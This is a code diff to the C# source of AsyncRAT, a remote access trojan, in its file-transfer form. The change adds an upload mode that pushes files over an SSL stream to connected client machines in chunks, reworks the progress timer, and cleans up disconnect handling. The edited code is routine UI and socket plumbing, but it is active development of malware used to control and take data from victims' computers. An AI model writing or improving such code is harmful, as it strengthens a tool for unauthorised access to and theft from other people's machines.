@@ -26,28 +26,46 @@ namespace AsyncRAT_Sharp.Forms
         public Form1 F { get; set; }
         internal Clients C { get; set; }
         public long dSize = 0;
-        public bool isDownload = false;
         private long BytesSent = 0;
-        private Timer Tick = null;
+        public string fullFileName;
+        public string clientFullFileName;
+        private bool isUpload = false;
         private async void timer1_Tick(object sender, EventArgs e)
         {
-            labelsize.Text = $"{Methods.BytesToString(dSize)} \\ {Methods.BytesToString(C.BytesRecevied)}";
-            if (C.BytesRecevied >= dSize)
+            if (!isUpload)
             {
-                labelsize.Text = "Downloaded";
-                labelsize.ForeColor = Color.Green;
-                timer1.Stop();
-                await Task.Delay(1500);
-                this.Close();
+                labelsize.Text = $"{Methods.BytesToString(dSize)} \\ {Methods.BytesToString(C.BytesRecevied)}";
+                if (C.BytesRecevied >= dSize)
+                {
+                    labelsize.Text = "Downloaded";
+                    labelsize.ForeColor = Color.Green;
+                    timer1.Stop();
+                    await Task.Delay(1500);
+                    this.Close();
+                }
+            }
+            else
+            {
+                labelsize.Text = $"{Methods.BytesToString(dSize)} \\ {Methods.BytesToString(BytesSent)}";
+                if (BytesSent >= dSize)
+                {
+                    labelsize.Text = "Uploaded";
+                    labelsize.ForeColor = Color.Green;
+                    timer1.Stop();
+                    await Task.Delay(1500);
+                    this.Close();
+                }
             }
         }
 
         private void SocketDownload_FormClosed(object sender, FormClosedEventArgs e)
         {
-            if (isDownload)
+            try
             {
-                if (C != null) C.Disconnected();
+                C?.Disconnected();
+                timer1?.Dispose();
             }
+            catch { }
         }
 
         public void Send(object obj)
@@ -56,10 +74,10 @@ namespace AsyncRAT_Sharp.Forms
             {
                 try
                 {
+                    isUpload = true;
                     byte[] msg = (byte[])obj;
                     byte[] buffersize = BitConverter.GetBytes(msg.Length);
                     C.ClientSocket.Poll(-1, SelectMode.SelectWrite);
-                    Tick = new Timer(new TimerCallback(Timer3), null, 0, 1000);
                     C.ClientSslStream.Write(buffersize);
                     C.ClientSslStream.Flush();
                     int chunkSize = 50 * 1024;
@@ -78,31 +96,13 @@ namespace AsyncRAT_Sharp.Forms
                         } while (bytesToRead > 0);
 
                         binaryReader.Close();
+                        C?.Disconnected();
                     }
                 }
                 catch
                 {
-                    return;
+                    C?.Disconnected();
                 }
-            }
-        }
-
-        private void Timer3(object obj)
-        {
-            if (Program.form1.InvokeRequired)
-            {
-                Program.form1.BeginInvoke((MethodInvoker)(async () =>
-                {
-                labelsize.Text = $"{Methods.BytesToString(dSize)} \\ {Methods.BytesToString(BytesSent)}";
-                    if (BytesSent > dSize)
-                    {
-                        labelsize.Text = "Downloaded";
-                        labelsize.ForeColor = Color.Green;
-                        timer1.Stop();
-                        await Task.Delay(1500);
-                        this.Close();
-                    }
-                }));
             }
         }
     }
